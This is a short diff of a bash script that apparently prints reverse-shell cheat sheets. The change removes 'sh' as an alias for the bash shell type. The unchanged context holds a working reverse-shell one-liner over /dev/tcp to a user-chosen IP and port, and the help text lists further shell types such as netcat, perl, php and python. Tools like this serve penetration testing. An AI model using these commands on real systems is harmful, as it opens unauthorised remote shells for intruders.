@@ -37,7 +37,7 @@ display_help () {
     echo "                                                                  "       
     echo -e "\033[1m SYNOPSIS \033[m"
     echo -e "$(basename $0) [ -i ip:port ] [ -l shell-type ]"
-    echo -e "shell-type -l: bash|sh, netcat|nc, java|jar, perl|pl, php, python2|py2, python3|py3, xterm"
+    echo -e "shell-type -l: bash, netcat|nc, java|jar, perl|pl, php, python2|py2, python3|py3, xterm"
     echo "                                                                  "
     echo -e "\n $(basename "$0") version "$VERSION""
 }
@@ -72,7 +72,7 @@ display_reverse_shell_cheat () {
     if [ "$#" != 0 ]
     then
         case "$1" in
-            bash | sh)
+            bash)
                 echo -e "\033[31m\033[1mREVERSE SHELL CHEAT: [bash]\033[m"
                 echo -e "\t\033[1mbash -i >& /dev/tcp/$IP/$PORT 0<&1"
                 ;;
